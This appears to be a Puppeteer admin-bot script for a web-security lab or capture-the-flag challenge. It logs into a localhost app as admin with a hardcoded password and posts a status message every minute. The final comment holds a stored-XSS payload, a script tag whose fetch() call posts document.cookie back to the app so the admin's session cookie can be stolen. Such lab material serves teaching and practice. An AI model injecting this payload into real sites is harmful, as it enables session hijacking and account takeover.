import puppeteer from "puppeteer";

(async () => {
  // Launch the browser and open a new blank page
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium-browser",
    args: ["--no-sandbox"],
  });
  const page = await browser.newPage();

  // Navigate the page to a URL
  while (true) {
    try {
      await page.goto("http://localhost:3000/login");
      break;
    } catch (e) {
      console.log("Retrying...");
    }
  }

  // Type into search box
  await page.type("#username", "admin");
  await page.type("#password", "wontguesstooeasily");

  // Wait and click on page change
  await Promise.all([page.waitForNavigation(), page.click("#login")]);

  console.log("Refreshing page every minute...");
  setInterval(async () => {
    // Click on the button
    console.log("Refreshing page...");
    //console.log(await page.cookies());
    await page.reload();
    await page.type("#title", "Status by the admin");
    await page.type("#content", "I am the admin, we remain unhacked.");
    await page.click(".btn.btn-primary");
  }, 60000);
})();

//<script>fetch("http://localhost:3000/api/new-post", {method: "POST",headers: {"Content-Type": "application/json",},body: JSON.stringify({title: "Pwned",content: document.cookie,id:"dumb"})})</script>
